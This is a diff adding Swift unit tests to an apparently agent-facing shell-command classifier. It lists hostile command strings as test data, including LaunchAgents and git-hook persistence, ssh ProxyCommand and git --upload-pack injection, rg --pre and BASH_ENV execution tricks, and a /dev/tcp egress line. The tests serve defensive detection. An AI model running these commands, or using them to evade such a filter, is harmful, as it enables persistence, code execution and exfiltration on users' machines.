@@ -92,4 +92,30 @@ import BuddyCore
         #expect(a.category == .ejecuta)
         #expect(long.category == .lectura)
     }
+
+    @Test(arguments: [
+        ("cp -t ~/Library/LaunchAgents x.plist", RuleCategory.rutaProtegida), ("cp -r evil-hooks .husky", .rutaProtegida),
+        ("mv evil .githooks", .rutaProtegida), ("cp x ~/Library/LaunchAgents/", .rutaProtegida),
+        ("ssh -o ProxyCommand='sh -c x' h 'ls'", .ejecuta), ("ssh -oProxyCommand=evil h ls", .ejecuta),
+        ("ssh -o LocalCommand=x -o PermitLocalCommand=yes h ls", .ejecuta), ("ssh -F ./cfg h ls", .ejecuta),
+        ("git fetch --upload-pack='sh -c x' origin", .ejecuta), ("git clone -u 'sh -c x' https://x/y", .ejecuta),
+        ("git push --receive-pack=x origin", .ejecuta), ("git apply evil.patch", .desconocido), ("git am x.mbox", .desconocido),
+        ("rg -n foo --pre=./evil.sh .", .ejecuta), ("rg -n foo --pre ./evil.sh .", .ejecuta),
+        ("sort --compress-program=sh a", .ejecuta), ("bat --pager='sh -c x' f", .ejecuta),
+        ("zip -TT 'sh -c x' a.zip f", .ejecuta), ("less '+!rm -rf x' f", .desconocido), ("man -P 'sh -c x' ls", .desconocido),
+        ("more f", .desconocido), ("tar xf evil.tar", .desconocido), ("tar -cf x.tar --to-command='sh -c x' .", .desconocido),
+        ("unzip evil.zip", .desconocido), ("patch -p1 < evil.patch", .desconocido),
+        ("printf x > /dev/tcp/1.2.3.4/80", .sale), ("cat a < /dev/udp/1.2.3.4/53", .sale),
+        ("export BASH_ENV=/tmp/evil.sh", .ejecuta), ("BASH_ENV=/tmp/x git commit -m y", .ejecuta),
+        ("export ZDOTDIR=/tmp/z", .ejecuta), ("PROMPT_COMMAND=x ls", .ejecuta),
+        ("timeout -s KILL 5 python3 x", .ejecuta), ("timeout --kill-after=2 5 grep x f", .lectura),
+    ])
+    func reviewOfBlockTwo(command: String, expected: RuleCategory) {
+        #expect(category(command) == expected, "\(command)")
+    }
+
+    @Test(arguments: ["rg -n foo src", "sort -u a.txt", "ls -la ~/.ssh", "zip -r out.zip src", "git log -p -3", "bat a.txt"])
+    func reviewOfBlockTwoStillPasses(command: String) {
+        #expect(ShellRule.assess(command, context: ruleContext).category.passesInAutoMode, "should pass: \(command)")
+    }
 }
